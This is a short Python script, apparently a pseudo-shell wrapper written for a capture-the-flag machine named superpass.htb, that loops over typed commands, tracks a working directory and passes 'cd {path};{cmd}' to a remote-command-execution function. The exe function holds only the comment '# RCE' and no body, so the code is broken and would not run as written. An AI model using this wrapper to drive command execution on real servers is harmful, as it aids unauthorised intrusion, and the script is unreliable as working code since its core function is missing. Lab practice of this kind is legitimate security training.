def exe(cmd):
    # RCE

path = '/var/www/www-data/'
while True:
    print()
    print(f'---- (www-data@superpass.htb) - [{path}]')
    print('|')
    cmd = str(input(" -- $ "))
    if(cmd == ':q' or cmd == 'exit' or cmd == 'exit()'):
        break
        exit()
    if(cmd.split(' ')[0] == 'setpath'):
        path = cmd.split(' ')[1]
        continue
    if(cmd.__contains__('cd')):
        if(cmd == 'cd ..'):
            path = path.rsplit('/', 1)[0]
        elif(cmd.__contains__('/')):
            if(cmd[3] == '/'):
                path = cmd.split(' ')[1]
        else:
            path += '/' + cmd.split(' ')[1]
    # print(f'cd {path};{cmd}')
    exe(f'cd {path};{cmd}')

